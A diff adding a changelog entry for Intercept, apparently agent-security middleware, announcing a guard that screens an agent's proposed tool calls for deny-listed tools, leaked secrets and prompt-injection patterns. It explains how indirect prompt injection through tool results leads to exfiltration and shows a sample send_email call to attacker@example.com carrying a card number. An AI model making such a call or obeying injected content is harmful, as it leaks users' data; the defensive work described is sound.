@@ -6,6 +6,30 @@ rss: true
 
 Product updates and release notes for Intercept.
 
+<Update label="August 6, 2026" description="v0.3.0" tags={["Release", "Security"]}>
+    Added `promptphp/intercept-tool-approval-guard`, a new middleware that inspects the tool calls an agent proposes while pausing for human approval, before they are surfaced for review.
+
+    Intercept has always inspected what goes *out*. It never saw what comes back in — tool results, retrieved documents, and conversation history do not pass through the middleware pipeline, and that is exactly where indirect prompt injection lives.
+
+    When an agent is manipulated by content Intercept never saw, the damage almost always surfaces as a tool call:
+
+    ```text
+    send_email(to: "attacker@example.com", body: "card 4111111111111111")
+    ```
+
+    Tool Approval Guard inspects those proposed calls. It checks three things:
+
+    - whether the tool is permitted at all, via allow and deny lists
+    - whether an argument carries personal or secret-like data, which signals exfiltration
+    - whether an argument matches a prompt injection pattern, which signals the model was manipulated
+
+    It reuses the detectors and patterns from PII Redactor and Injection Guard rather than maintaining a second copy, so it inherits their behaviour exactly.
+
+    This release also closes an asymmetry shipped in v0.2.0: Intercept scanned what a *human* edited when resolving a paused run, but trusted whatever the *model* proposed.
+
+    The middleware only acts when a run pauses for approval, so adding it is safe even before you adopt human-in-the-loop.
+</Update>
+
 <Update label="July 31, 2026" description="v0.2.0" tags={["Release", "Security"]}>
     Added tool approval decision scanning to `PromptInjectionGuard` and `PIIRedactor`.
 
